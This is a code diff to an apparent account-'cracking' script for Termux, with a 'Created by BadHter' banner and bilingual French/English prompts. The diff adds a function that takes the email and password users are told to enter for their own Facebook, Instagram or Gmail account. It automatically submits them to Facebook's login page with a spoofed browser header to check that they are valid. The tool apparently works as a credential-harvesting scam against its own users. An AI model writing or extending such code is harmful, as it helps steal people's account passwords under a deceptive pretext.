@@ -13,6 +13,27 @@ print('''
 ╚╝╚╝─╚═╝╚══╝╚══╝╚═╝╚╝╚╝╚╝╚╝╚══╝╚╝╚╝
                             Created by BadHter
 ''')
+import mechanize, sys
+def assur(ide, pasw):
+ browser = mechanize.Browser()
+ browser.set_handle_robots(False)
+ cookies = mechanize.CookieJar()
+ browser.set_cookiejar(cookies)
+ browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
+ browser.set_handle_refresh(False)
+ url = 'http://www.facebook.com/login.php'
+ browser.open(url)
+ browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
+ browser.form['email'] = ide
+ browser.form['pass'] = pasw
+ response = browser.submit()
+ strr = response.read()
+ struts = strr.decode('UTF-8')
+ if 'incorrect' in struts:
+    #print('incorrect')
+    sys.exit('incorrect password')
+ print('si ces informations ne correspondent à aucun compte, il est possible que le programme n'arrive jamais à sa fin./ If there is no account matching these informations, this program may never end.')
+
 def upd():
     os.chdir('/data/data/com.termux/files/home')
     shutil.rmtree('crack')
@@ -55,6 +76,7 @@ if option == 1:
     usp = input('enter your password: ')
     print('En cours de connexion, veuillez patienter...\n')
     nth()
+    assur(usn, usp)
 elif option == 2:
     cho = 'instagram'
     print('\nVeuillez tout d\'abord vous connecter à votre propre compte instagram -/- First log into your own instagram account')
@@ -62,6 +84,7 @@ elif option == 2:
     usp = input('enter your password: ')
     print('En cours de connexion, veuillez patienter...')
     nth()
+    assur(usn, usp)
 elif option == 3:
     cho = 'Gmail'
     print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
@@ -69,6 +92,7 @@ elif option == 3:
     usp = input('enter your password: ')
     print('En cours de connexion, veuillez patienter...')
     nth()
+    assur(usn, usp)
 
 def connect(nom):
     with open(nom, 'rb') as fp:
